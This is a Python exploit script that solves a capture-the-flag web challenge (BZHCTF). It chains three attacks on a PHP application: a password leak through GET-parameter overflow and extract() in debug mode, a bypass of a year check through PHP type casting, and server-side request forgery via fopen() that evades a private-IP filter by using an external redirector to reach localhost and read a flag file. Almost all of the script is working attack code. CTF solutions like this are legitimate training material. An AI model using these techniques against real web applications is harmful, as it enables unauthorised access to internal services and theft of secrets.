#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Mika

from requests import Session
from sys import argv
from datetime import datetime
import re

if len(argv) != 3:
    print("Usage: python3 solve.py <url> <redirector>")
    exit()


def step1():
    """
    Retrieve password through :
        - GET argument overflow (> 1000 to trigger error)
        - Debug mode abusing extract() function
    """
    try:
        global url, s
        # payload = "?DEBUG=1" + "&a" * 1000
        # r = s.get(url + "/login.php" + payload)
        # password = re.findall(r"\[PASSWORD\] => ([a-f0-9]{32})", r.text)[0]
        password = "56c4f28cf6a0805370eef7c64699a4b3"
        s.get(url + "/login.php?password=" + password)
        print(f"[+] Password: {password}")
    except Exception as e:
        print("[-] Error: " + str(e))
        exit()


def step2():
    """
    Success in the game without inputting the current year by abusing the way PHP casts
    """
    try:
        global url, s
        year = str(datetime.now().year - 1) + "." + "9" * 15
        r = s.get(url + "/game.php?year=" + year)
        print(f"[+] Year: {year}")
    except Exception as e:
        print("[-] Error: " + str(e))
        exit()


def step3():
    """
    Retrieve the flag using SSRF with fopen() and bypass the private IP restriction with a 302 on the public IP
        - Your redirector should redirect towards http://localhost:8000{uri}
    """
    try:
        global url, redirector, s
        r = s.get(url + "/private.php?poem=" + redirector + "/")
        flag = re.findall(r"flag_[a-f0-9]{32}.txt", r.text)[0]
        print(f"[+] Flag file: {flag}")
        r = s.get(url + "/private.php?poem=" + redirector + "/" + flag)
        flag = re.findall(r"BZHCTF\{.*\}", r.text)
        print(f"[+] Flag: {flag[0]}")
    except Exception as e:
        print("[-] Error: " + str(e))
        print(r.text)


url = argv[1]
redirector = argv[2]
s = Session()

s.get(url + "/index.php")

step1()
step2()
step3()
